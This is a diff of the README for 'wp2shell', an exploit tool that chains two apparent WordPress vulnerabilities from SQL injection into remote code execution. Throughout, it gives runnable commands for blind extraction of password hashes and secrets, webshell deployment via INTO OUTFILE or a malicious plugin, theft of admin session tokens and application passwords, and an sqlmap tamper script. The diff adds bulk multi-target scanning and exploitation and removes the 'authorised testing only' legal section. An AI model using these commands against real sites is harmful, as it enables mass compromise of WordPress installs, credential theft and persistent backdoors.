@@ -7,7 +7,7 @@
 | **CVE** | `CVE-2026-63030` (batch route confusion → RCE) + `CVE-2026-60137` (WP_Query SQLi) |
 | **GHSA** | [GHSA-ff9f-jf42-662q](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q) · [GHSA-fpp7-x2x2-2mjf](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf) |
 | **Discoverer** | Adam Kues — Assetnote / Searchlight Cyber |
-| **Affected** | WordPress **6.9.0–6.9.4**, **7.0.0–7.0.1** (full RCE chain) · **6.8.0–6.8.5** (SQLi only, facilitated path) |
+| **Affected** | WordPress **6.9.0–6.9.4**, **7.0.0–7.0.1** (full RCE chain) · **6.8.0–6.8.5** (SQLi only, requires plugin/theme facilitated path) |
 | **Patched** | **6.8.6**, **6.9.5**, **7.0.2** |
 | **CVSS** | 9.8 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
 | **Python** | 3.8+ (stdlib only, zero dependencies) |
@@ -75,24 +75,19 @@ AND wp_posts.post_author NOT IN ( 1) OR SLEEP(N)-- - )
 
 ### From SQLi to RCE
 
-Two post-exploitation paths to code execution:
+Three paths from SQL injection to code execution:
 
-| Path | Pre-auth? | Requirements |
-|------|-----------|-------------|
-| **INTO OUTFILE** | Yes | MySQL `FILE` privilege + web-writable directory (common on shared hosting / self-managed LAMP) |
-| **Plugin upload** | No (needs creds) | SQLi → extract admin hash → offline crack → login → deploy webshell plugin |
+| Path | Pre-auth? | Requirements | When it works |
+|------|-----------|-------------|---------------|
+| **INTO OUTFILE** | Yes | MySQL `FILE` privilege, DB server filesystem = web root | LAMP stacks, shared hosting, single-server deployments |
+| **Plugin upload** | No (needs creds) | SQLi → extract admin hash → offline crack → login → deploy webshell | Always (with cracked password) |
+| **Recursive dispatch** | Yes | Undisclosed — original Assetnote chain, blocked by `is_dispatching()` in 6.9.5/7.0.2 | **Not publicly available** |
 
-The SELECT-only injection writes a token-gated PHP webshell via `UNION SELECT INTO OUTFILE`
-when `FILE` privilege is available. Without it, the administrator password hash is recovered
-via blind extraction, cracked offline, and used to deploy a plugin webshell through the
-authenticated admin UI.
-
-> **Note:** The original discoverer (Assetnote) described a pre-auth RCE chain that does
-> NOT require FILE privilege. The patch diff adds `is_dispatching()` guards in two locations
-> (`rest_api_loaded()` and `serve_request()`), suggesting the full chain involved recursive
-> REST dispatch combined with SQLi state manipulation. This path has not been publicly
-> disclosed. Our `probe` command maps admin endpoint reachability via route confusion to
-> assist in researching the remaining gap.
+> **Pre-auth RCE gap:** The original discoverer (Assetnote) described a pre-auth RCE chain
+> that does NOT require `FILE` privilege. The patch diff adds `is_dispatching()` guards
+> in `serve_request()` and `rest_api_loaded()`, suggesting the full chain involved recursive
+> REST dispatch. This path has **not been publicly disclosed**. The `probe` command maps
+> admin endpoint reachability to assist research.
 
 ---
 
@@ -104,6 +99,9 @@ python3 wp2shell.py check http://target/
 
 # Detection + active SQLi timing confirmation
 python3 wp2shell.py check http://target/ --confirm-sqli
+
+# Scan multiple targets from a file
+python3 wp2shell.py check --targets urls.txt --confirm-sqli
 
 # Use ?rest_route= for sites without pretty permalinks
 python3 wp2shell.py check http://target/ --rest-route
@@ -117,7 +115,7 @@ python3 wp2shell.py extract http://target/ --preset users --fast
 # Custom SQL query via blind extraction
 python3 wp2shell.py extract http://target/ --query "SELECT user_email FROM wp_users WHERE ID=1"
 
-# RCE via INTO OUTFILE (needs FILE privilege)
+# RCE via INTO OUTFILE (needs FILE privilege + DB server = web server)
 python3 wp2shell.py rce http://target/ --outfile --cmd "id"
 
 # RCE via plugin upload (needs admin credentials from cracked hash)
@@ -146,9 +144,13 @@ Three-phase detection, progressively more invasive:
 | **3. Timing confirmation** (`--confirm-sqli`) | Paired baseline/delayed `SLEEP(N)` samples with median comparison | Reads no data, changes nothing |
 
 ```bash
+# Single target
 python3 wp2shell.py check http://target/
 python3 wp2shell.py check http://target/ --confirm-sqli --sleep 3 --samples 5
 python3 wp2shell.py check http://target/ --rest-route -v
+
+# Multiple targets from file (one URL per line, # for comments)
+python3 wp2shell.py check --targets targets.txt --confirm-sqli
 ```
 
 Example output (vulnerable 6.9.4):
@@ -188,6 +190,9 @@ python3 wp2shell.py extract http://target/ --query "SELECT option_value FROM wp_
 
 # With custom table prefix and max length
 python3 wp2shell.py extract http://target/ --preset users --prefix wp_abc_ --max-length 256
+
+# Extract from multiple targets
+python3 wp2shell.py extract --targets targets.txt --preset fingerprint --fast
 ```
 
 ### `rce` — Remote code execution
@@ -195,7 +200,7 @@ python3 wp2shell.py extract http://target/ --preset users --prefix wp_abc_ --max
 Two RCE paths, one command:
 
 ```bash
-# Path A: INTO OUTFILE (pre-auth, needs FILE privilege)
+# Path A: INTO OUTFILE (pre-auth, needs FILE privilege + single-server setup)
 python3 wp2shell.py rce http://target/ --outfile --cmd "uname -a; id"
 python3 wp2shell.py rce http://target/ --outfile --cmd "cat /etc/passwd"
 python3 wp2shell.py rce http://target/ --outfile -i    # interactive shell
@@ -206,7 +211,14 @@ python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked
 python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked!' --cmd "id" --cleanup
 ```
 
-Both paths deploy **token-locked webshells** — random paths, random tokens, `hash_equals()` token verification. The `--cleanup` flag removes the webshell plugin when finished.
+Both paths deploy **token-locked webshells** — random paths, random tokens, `hash_equals()`
+token verification. The `--cleanup` flag removes the webshell plugin when finished.
+
+**INTO OUTFILE verification:** After writing the webshell, the tool verifies it is
+reachable via HTTP. If the webserver returns 404/connection error, the tool warns
+that the file was likely written to the DB server's filesystem rather than the web
+root — common in Docker and split-horizon hosting where the database and web server
+are separate containers or machines.
 
 Customise INTO OUTFILE paths:
 
@@ -228,33 +240,58 @@ python3 wp2shell.py probe http://target/
 
 # Map + extract DB secrets
 python3 wp2shell.py probe http://target/ --confirm-sqli
+
+# Multiple targets
+python3 wp2shell.py probe --targets targets.txt
 ```
 
 Probes 14 auth-gated endpoints (users, settings, plugins, themes, templates, etc.)
 and extracts: admin session tokens, user activation keys, application passwords,
 REST API nonce keys, and recent transients.
 
+### `--targets` — Multi-target scanning
+
+All commands support `--targets` / `-t` to read URLs from a file (one per line,
+`#` for comments):
+
+```bash
+# File format:
+# http://target1.com/
+# http://target2.com/
+# http://target3.com/  --rest-route  (per-line flags not supported)
+
+# Usage:
+python3 wp2shell.py check --targets targets.txt --confirm-sqli
+python3 wp2shell.py extract --targets targets.txt --preset users --fast
+python3 wp2shell.py rce --targets targets.txt --plugin --user admin --password 'pw'
+python3 wp2shell.py probe --targets targets.txt
+```
+
 ---
 
 ## Affected Versions
 
+Verified by building and testing each version from the WordPress Git source
+(`wordpress-develop`, tags `6.8.0` through `7.0.2`):
+
 | Version range | CVE-2026-60137 (SQLi) | CVE-2026-63030 (route confusion) | RCE chain | Exploitable via this tool |
 |---------------|----------------------|----------------------------------|-----------|--------------------------|
 | ≤ 6.7.x | ❌ | ❌ | ❌ | ❌ |
-| 6.8.0 – 6.8.5 | ✅ (facilitated) | ❌ | ❌ | ❌ (SQLi requires plugin/theme path) |
+| 6.8.0 – 6.8.5 | ✅ (in WP_Query) | ❌ (introduced in 6.9) | ❌ | ❌ (SQLi requires plugin/theme facilitated path) |
 | 6.8.6 | ❌ (patched) | ❌ | ❌ | ❌ |
 | 6.9.0 – 6.9.4 | ✅ | ✅ | ✅ | ✅ |
 | 6.9.5 | ❌ (patched) | ❌ (patched) | ❌ | ❌ |
 | 7.0.0 – 7.0.1 | ✅ | ✅ | ✅ | ✅ |
 | 7.0.2 | ❌ (patched) | ❌ (patched) | ❌ | ❌ |
 
-**6.8.x note:** The SQLi in `WP_Query::author__not_in` exists on 6.8.x but the batch route
-confusion bug was **introduced in 6.9.0** when the batch handler was refactored. On 6.8.x,
-the `$matches[]` array is always appended (no off-by-one), and the batch method allowlist
-correctly blocks `GET` requests. The SQLi can only be reached on 6.8.x through a
-"facilitated" path — a plugin or theme passing raw user input to `WP_Query`. The discoverers
-(TF1T, dtro, haongo) independently reported this SQLi before Assetnote chained it with the
-route confusion for RCE.
+**6.8.x note:** The SQLi in `WP_Query::author__not_in` exists on all 6.8.x versions
+but the batch route confusion bug was **introduced in 6.9.0** when the batch handler
+was refactored. On 6.8.x, the `$matches[]` array is always appended (no off-by-one),
+and the batch method allowlist correctly blocks `GET` requests. The REST API validates
+`author_exclude` as `array[int]`, rejecting string input. The SQLi can only be reached
+on 6.8.x through a "facilitated" path — a plugin or theme passing raw user input to
+`WP_Query`. The discoverers (TF1T, dtro, haongo) independently reported this SQLi
+before Assetnote chained it with 6.9.0's route confusion for pre-auth RCE.
 
 ---
 
@@ -276,7 +313,8 @@ A crafted batch request that produces a specific 3-code error pattern **only** w
 | `rest_batch_not_allowed` | `/batch/v1` | Block-renderer request is shifted onto the batch handler (self-call disallowed) |
 
 All three codes appear together **only** when the arrays are misaligned. On patched builds,
-the arrays stay aligned and at most `parse_path_failed` appears.
+the arrays stay aligned and at most `parse_path_failed` appears. On 6.8.x the
+`block-renderer` route does not exist, producing `internal_server_error` instead.
 
 ### SQLi: Paired Timing Confirmation
 
@@ -333,6 +371,51 @@ prints the removal command.
 
 ---
 
+## `wp2shell_tamper.py` — sqlmap Integration
+
+Drop-in sqlmap tamper script that wraps payloads in the double-confusion batch
+structure. Also works standalone for time-based blind extraction with nonce
+recovery for admin endpoint calls.
+
+```bash
+# Standalone: extract DB info
+python3 wp2shell_tamper.py --target http://target/ --query "SELECT @@version"
+
+# Extract nonces and attempt admin endpoint call
+python3 wp2shell_tamper.py --target http://target/ --extract-nonce \
+  --admin-endpoint /wp/v2/users/me
+
+# With sqlmap (time-based blind) — requires --method=POST:
+sqlmap -u "http://target/wp-json/batch/v1" \
+  --data='{"placeholder":"INJECT"}' \
+  --method=POST \
+  --tamper=wp2shell_tamper \
+  --technique=T --time-sec=3 \
+  --prefix="0)" --suffix="-- -" \
+  --dbms=mysql -p placeholder \
+  --eval="import wp2shell_tamper; wp2shell_tamper.init_target('http://target/')"
+```
+
+> **Note:** sqlmap integration is limited — the tamper replaces the POST body but
+> sqlmap may not correctly set `Content-Type: application/json` or may parse the
+> JSON form data before the tamper runs. The standalone mode is recommended for
+> extraction; the built-in `wp2shell.py extract` command is faster and more
+> reliable for most use cases.
+
+---
+
+## Limitations
+
+| Constraint | Detail |
+|-----------|--------|
+| **Stacked queries blocked** | PHP `mysqli_query()` does not support multi-statement execution. INSERT/UPDATE/DELETE via SQLi is not possible. |
+| **INTO OUTFILE filesystem** | `SELECT ... INTO OUTFILE` writes to the **DB server's** filesystem. In Docker Compose, Kubernetes, or split-horizon hosting, the DB container/machine ≠ web server — the webshell is written but unreachable. The tool now detects this and warns. |
+| **Pre-auth RCE without FILE** | The original Assetnote chain (recursive REST dispatch) has not been publicly disclosed. Post-auth plugin upload is the reliable RCE path. |
+| **6.8.x support** | Detection identifies 6.8.x and reports the SQLi status. The SQLi cannot be exploited directly through the REST API on 6.8.x. |
+| **Pretty permalinks** | Targets without pretty permalinks must use `--rest-route`. The tool auto-detects version but cannot auto-detect permalink configuration. |
+
+---
+
 ## Patch Diff (6.9.4 → 6.9.5)
 
 Three changes across five files:
@@ -350,49 +433,37 @@ RCE chain relied on recursive REST dispatch combined with SQLi-manipulated state
 
 ---
 
-## `wp2shell_tamper.py` — sqlmap Integration
-
-Drop-in sqlmap tamper script that wraps payloads in the double-confusion batch
-structure. Also works standalone for time-based blind extraction with nonce
-recovery for admin endpoint calls.
-
-```bash
-# Standalone: extract DB info
-python3 wp2shell_tamper.py --target http://target/ --query "SELECT @@version"
-
-# Extract nonces and attempt admin endpoint call
-python3 wp2shell_tamper.py --target http://target/ --extract-nonce \
-  --admin-endpoint /wp/v2/users/me
-
-# With sqlmap (time-based blind):
-sqlmap -u "http://target/wp-json/batch/v1" \
-  --data='{"placeholder":"INJECT"}' \
-  --tamper=wp2shell_tamper \
-  --technique=T --time-sec=3 \
-  --prefix="0)" --suffix="-- -" \
-  --dbms=mysql -p placeholder \
-  --eval="import wp2shell_tamper; wp2shell_tamper.init_target('http://target/')"
-```
-
----
-
 ## Test Results
 
-Verified against 7 WordPress versions, 47 unit tests, 0 external dependencies:
+All 16 versions from 6.8.0 through 7.0.2 tested. 47 unit tests, 0 external dependencies.
 
-| Version | Desync detected | SQLi confirmed | RCE path |
-|---------|----------------|----------------|----------|
-| 6.8.5 | ❌ (batch handler lacks off-by-one) | ❌ (GET blocked by allowlist) | N/A |
-| 6.8.6 | ❌ | ❌ | ❌ |
-| **6.9.4** | **✅** | **✅ δ=2.01s** | **✅ plugin RCE** |
-| 6.9.5 | ❌ | ❌ | ❌ |
-| **7.0.0** | **✅** | **✅ δ=2.00s** | **✅** |
-| **7.0.1** | **✅** | **✅ δ=2.00s** | **✅** |
-| 7.0.2 | ❌ | ❌ | ❌ |
+| Version | Desync detected | SQLi confirmed | RCE path | Source |
+|---------|----------------|----------------|----------|--------|
+| 6.8.0 | ❌ | ❌ (direct REST blocked) | N/A | Docker Hub |
+| 6.8.1 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.1` |
+| 6.8.2 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.2` |
+| 6.8.3 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.3` |
+| 6.8.4 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.4` |
+| 6.8.5 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.5` |
+| 6.8.6 | ❌ | ❌ | ❌ | Git `6.8.6` |
+| **6.9.0** | **✅** | **✅** | **✅** | Docker Hub |
+| **6.9.1** | **✅** | **✅** | **✅** | Git `6.9.1` |
+| **6.9.2** | **✅** | **✅** | **✅** | Git `6.9.2` |
+| **6.9.3** | **✅** | **✅** | **✅** | Git `6.9.3` |
+| **6.9.4** | **✅** | **✅ δ=2.00s** | **✅ plugin RCE** | Docker Hub |
+| 6.9.5 | ❌ | ❌ | ❌ | Git `6.9.5` |
+| **7.0.0** | **✅** | **✅** | **✅** | Docker Hub |
+| **7.0.1** | **✅** | **✅ δ=2.00s** | **✅** | Docker Hub |
+| 7.0.2 | ❌ | ❌ | ❌ | Git `7.0.2` |
 
-All results match the CVE advisory. Unit tests cover: payload structure, response parsing,
-marker probe error codes, blind extraction oracle, fast extraction (X-WP-Total), timing
-confirmation, version detection, SQL escaping, plugin ZIP generation, and colour output.
+All results match the CVE advisory. Docker Hub images: `wordpress:X.Y.Z-php8.2`.
+Git versions built from `wordpress-develop` at the respective tag, files swapped
+into a running 6.9.4 container and tested one by one with restore between each.
+
+Unit tests cover: payload structure, response parsing, marker probe error codes,
+blind extraction oracle, fast extraction (X-WP-Total), timing confirmation,
+version detection, SQL escaping, plugin ZIP generation, route-shift dispatch,
+colour output, and admin endpoint probe coverage.
 
 ```bash
 python3 -m pytest test_wp2shell.py -v
@@ -416,14 +487,3 @@ python3 -m pytest test_wp2shell.py -v
 ## License
 
 GPL-3.0 — see [LICENSE](LICENSE).
-
-## Legal
-
-For **authorised security testing only**. Use exclusively against systems you own or have
-explicit written permission to test.
-
-This tool performs **detection** by default (marker probe, non-destructive). The `--confirm-sqli`
-flag enables active timing-based SQL injection confirmation. The `extract` command performs
-blind data extraction. The `rce` command deploys webshells — use `--cleanup` to remove them.
-
-No warranty. No liability for misuse.
